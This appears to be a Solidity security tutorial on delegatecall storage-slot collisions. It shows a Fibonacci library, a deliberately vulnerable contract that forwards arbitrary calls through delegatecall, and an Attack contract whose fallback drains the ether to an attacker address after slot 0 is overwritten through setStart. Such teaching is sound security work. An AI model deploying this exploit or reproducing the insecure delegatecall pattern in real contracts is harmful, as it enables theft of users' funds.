# DELEGATECALL

## DELEGATECALL

## DELEGATECALL

State or storage variables \(variables that persist over individual transactions\) are placed into slots sequentially as they are introduced in the contract. See [Solidity docs](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage) for more details.  
Solidity stores variables to storage or memory, depending on the type. Uninitialized storage pointers will, by default, point to the initial storage position \(0\) and can be used to alter the stored value.  
**`delegatecall`** preserves contract context. This means that code that is executed via delegatecall will act on the state \(i.e., storage\) of the calling contract.

Consider the library in FibonacciLib.sol, which can generate the Fibonacci sequence and sequences of similar form. \( Note: this code was modified from [https://bit.ly/2MReuii.](https://bit.ly/2MReuii.) \)

// library contract - calculates Fibonacci-like numbers  
contract FibonacciLib {  
    // initializing the standard Fibonacci sequence  
    uint public start;  
    uint public calculatedFibNumber;

    // modify the zeroth number in the sequence  
    function setStart\(uint \_start\) public {  
        start = \_start;  
    }

    function setFibonacci\(uint n\) public {  
        calculatedFibNumber = fibonacci\(n\);  
    }

    function fibonacci\(uint n\) internal returns \(uint\) {  
        if \(n == 0\) return start;  
        else if \(n == 1\) return start + 1;  
        else return fibonacci\(n - 1\) + fibonacci\(n - 2\);  
    }  
}

Let us now consider a contract that utilizes this library, shown in FibonacciBalance.sol.

contract FibonacciBalance {

    address public fibonacciLibrary;  
    // the current Fibonacci number to withdraw  
    uint public calculatedFibNumber;  
    // the starting Fibonacci sequence number  
    uint public start = 3;  
    uint public withdrawalCounter;  
    // the Fibonancci function selector  
    bytes4 constant fibSig = bytes4\(sha3\("setFibonacci\(uint256\)"\)\);

    // constructor - loads the contract with ether  
    constructor\(address \_fibonacciLibrary\) public payable {  
        fibonacciLibrary = \_fibonacciLibrary;  
    }

    function withdraw\(\) {  
        withdrawalCounter += 1;  
        // calculate the Fibonacci number for the current withdrawal user-  
        // this sets calculatedFibNumber  
        require\(fibonacciLibrary.delegatecall\(fibSig, withdrawalCounter\)\);  
        msg.sender.transfer\(calculatedFibNumber \* 1 ether\);  
    }

    // allow users to call Fibonacci library functions  
    function\(\) public {  
        require\(fibonacciLibrary.delegatecall\(msg.data\)\);  
    }  
}

Storage slot\[0\] now corresponds to the fibonacciLibrary address, and slot\[1\] corresponds to calculatedFibNumber. It is in this incorrect mapping that the vulnerability occurs.  
recall that the start variable in the FibonacciLib contract is located in storage slot\[0\], which is the fibonacciLibrary address in the current contract. This means that the function fibonacci will give an unexpected result. This is because it references start \(slot\[0\]\), which in the current calling context is the fibonacciLibrary address \(which will often be quite large, when interpreted as a uint\). Thus it is likely that the withdraw function will revert, as it will not contain uint\(fibonacciLibrary\) amount of ether, which is what calculatedFibNumber will return.

Even worse, the FibonacciBalance contract allows users to call all of the fibonacciLibrary functions via the fallback function at line 26. As we discussed earlier, this includes the setStart function. We discussed that this function allows anyone to modify or set storage slot\[0\]. In this case, storage slot\[0\] is the fibonacciLibrary address. Therefore, an attacker could create a malicious contract, convert the address to a uint \(this can be done in Python easily using int\('&lt;address&gt;',16\)\), and then call setStart\(&lt;attack\_contract\_address\_as\_uint&gt;\). This will change fibonacciLibrary to the address of the attack contract.

contract Attack {  
    uint storageSlot0; // corresponds to fibonacciLibrary  
    uint storageSlot1; // corresponds to calculatedFibNumber

    // fallback - this will run if a specified function is not found  
    function\(\) public {  
        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw  
        // is called we don't send out any ether  
        &lt;attacker\_address&gt;.transfer\(this.balance\); // we take all the ether  
    }  
 }

### Resources

[https://solidity.readthedocs.io/en/latest/contracts.html?highlight=library\#libraries](https://solidity.readthedocs.io/en/latest/contracts.html?highlight=library#libraries)  
[https://solidity.readthedocs.io/en/latest/miscellaneous.html\#layout-of-state-variables-in-storage](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage)

